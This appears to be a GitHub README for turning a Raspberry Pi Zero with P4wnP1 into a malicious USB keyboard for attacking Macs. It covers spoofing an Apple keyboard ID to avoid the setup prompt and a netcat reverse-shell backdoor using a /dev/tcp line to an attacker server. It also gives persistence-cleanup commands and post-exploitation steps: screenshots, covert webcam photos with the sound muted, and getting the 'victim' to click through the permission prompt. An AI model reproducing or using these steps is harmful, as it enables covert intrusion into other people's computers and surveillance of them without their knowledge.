# Ducky Raspberry Pi Zero for Mac

There are some threads about P4wnP1 ducky not running on Mac but here is an introduction about setting up P4wnP1 so your pi zero can attack Mac.

## Demo Video

## Requirements

1. Raspberry Pi Zero
2. 8G+ Micro SD card
3. USB Cable \(A-Male to Micro B\)

## Setup

1. Download Raspbian Stretch Lite [image](https://www.raspberrypi.org/downloads/raspbian/).
2. Install image on micro SD card with [Etcher](https://www.balena.io/etcher/).
3. Boot your pi and login with default username and password.
```
username: pi
password: raspberry
```
4. (Optional) Change default password for a better security.
5. Connect to network using Wi-Fi or ethernet (Adapter needed).
```shell
sudo raspi-config
```
6. Download P4wnP1 package and install it. \(If newer version is not working, I have an archived version in this repository that worked when I wrote this documentation.\)
```shell
git clone --recursive https://github.com/mame82/P4wnP1
cd P4wnP1/
./install.sh
```
7. (Important) Change scripts so it will run on Mac. This is a temporarily (03/25/19) workaround solution. "open('/dev/hidg0','rb')" is not working on Mac currently so add a timeout to line 200 in P4wnP1/boot/boot_P4wnP1.
```shell
timeout 1 python -c "with open('/dev/hidg0','rb') as f:  print ord(f.read(1))"
```
8. (Important) Use Vendor ID and Product ID from a real Apple keyboard in your payload so Mac won't be asking you to setup an unknown keyboard. See example [here](./payloads/hid_keyboard_hello_world.txt).
```
USB_VID="0x05ac"  # Vendor ID
USB_PID="0x027b"  # Product ID
```
9. Put your payload into P4wnP1/payloads/ on your pi zero. Load the payload in "P4wnP1/setup.cfg".
```
PAYLOAD=hid_keyboard_hello_world.txt  # Add to the end of the file
```
10. Shutdown the pi zero and plug it into a Mac with USB cable mentioned [above](#requirements). Use peripheral micro USB port, not the power port. No power needed here, pi zero takes power from target machine.
```shell
sudo shutdown -h now
```
11. If you want to edit the payload later, plug the pi zero into your machine, connect to Wi-Fi "P4wnP1" with password "MaMe82-P4wnP1", and ssh to it.
```shell
ssh pi@172.16.0.1
```

## Create a Reverse Shell Backdoor

1. Host Netcat server on your machine.
```shell
nc -l -p 8080 -vvv
```
2. Create a descriptor on target machine. Make sure to change the IP address and port to your server. Your server must be in the same network as target unless you have a public IP that can be accessed by target machine everywhere. \(Run the descriptor in background is recommended.\)
```shell
bash -i >& /dev/tcp/YOUR_SERVER_IP/8080 0>&1
```
3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
4. In [payloads/](./payloads/) there is a reverse shell ducky script example. Here is the clean up script if you use my example.
```shell
rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/rsa_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
echo "" | crontab - && crontab -r
```

## What Now

* Rick roll prank
```shell
# One privilege of hacking Mac is we have access to applescript.
osascript -e 'set volume 7'
pen https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

* Accessing sudo privilege
```shell
echo "password" | sudo -S ls
```

* Take a screenshot
```shell
screencapture ~/a.jpg
```

* Take a photo with Mac's webcam
```shell
# Since brew does not require sudo privilege, if victim has brew, this works.
brew install imagesnap
osascript -e 'set volume 0'  # mute
imagesnap ~/a.png
osascript -e 'tell application "System Events" to delay 1' && / 
osascript -e 'tell application "System Events" to keystroke return'  # Mac will ask for permission, make the victim hit enter!
```
